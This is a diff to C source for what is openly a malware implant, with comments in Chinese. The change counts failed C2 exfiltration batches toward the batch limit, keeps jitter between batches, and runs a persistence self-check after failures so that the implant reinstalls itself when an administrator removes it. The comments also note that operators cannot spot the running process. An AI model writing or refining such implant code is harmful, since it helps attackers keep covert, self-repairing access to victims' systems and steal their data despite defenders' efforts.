@@ -426,6 +426,24 @@ implant_err_t implant_run(implant_t *im)
              * 每次只发一批」，cron 下则是每周期只发一批 —— 部署侧看到
              * 进程在跑、也有字节，无从发现。 */
             if (im->opened) { im->src->close(im->src); im->opened = 0; }
+
+            /* 失败批必须计入 batches_done。
+             *
+             * 此前只有成功路径末尾才递增，于是回传持续失败时（C2 不可达、
+             * 对端重启、网络切换都是常态）batches_done 恒为 0，ST_WAIT 的
+             * 「batches_done >= max_batches」永不成立 —— 常驻进程无限重试，
+             * max_batches 形同虚设。
+             *
+             * 后果在 cron 形态下最重：部署用 --batches N 限定批次，指望它
+             * 跑完 N 批就退出；失败时它永不退出，cron 下一周期再拉起一个，
+             * 进程逐周期堆积，且每个都在重试回传。systemd 形态下则是
+             * 表面上 Restart=always 在管，实际 max_batches 从未生效过。 */
+            im->batches_done++;
+
+            /* 失败批同样是批结束：驻留自检照常发生。否则长期回传失败期间
+             * 管理员删掉驻留后不会被补装 —— 恰恰是最需要自愈的窗口。 */
+            if (im->audit_fn) (void)im->audit_fn(im->batches_done, im->audit_ud);
+
             uint64_t gap = im->cfg.interval_ms;
             if (im->cfg.jitter_ms)
                 gap += xs64(&im->rng) % (uint64_t)(im->cfg.jitter_ms + 1);
